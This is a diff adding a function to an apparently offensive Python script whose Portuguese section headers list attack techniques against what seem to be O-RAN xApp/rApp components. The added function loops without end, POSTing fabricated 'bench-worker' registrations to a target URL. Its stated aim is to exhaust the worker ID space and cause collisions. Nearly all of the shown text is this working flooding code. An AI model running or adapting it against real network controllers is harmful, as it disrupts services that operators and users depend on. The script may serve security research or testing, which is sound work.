@@ -59,3 +59,31 @@ def tecnica1_subscription_flood():
 # ============================================================
 # TECNICA 2: WORKER ID BRUTE FORCE (xApp)
 # ============================================================
+def tecnica2_worker_id_bruteforce():
+    """Exaure o espaco de IDs de workers - causa colisao e confusao"""
+    time.sleep(3)
+    worker_id = 0
+    while True:
+        try:
+            for _ in range(50):
+                worker_id = (worker_id + 1) % 100000
+                worker = {
+                    "id": f"bench-worker-{worker_id}",
+                    "latency_ms": round(random.uniform(0, 100), 2),
+                    "type": "benchmark",
+                    "seq": worker_id
+                }
+                data = json.dumps(worker).encode()
+                req = urllib.request.Request(BASE_URL, data=data, method="POST")
+                req.add_header('Content-Type', 'application/json')
+                with urllib.request.urlopen(req, timeout=1): 
+                    pass
+
+                time.sleep(0.3)
+        except Exception as e:
+            print(f"[BF-T2:WorkerID] Erro: {e}")
+            time.sleep(0.5)
+
+# ============================================================
+# TECNICA 3: POLICY PARAMETER FUZZING (rApp)
+# ============================================================
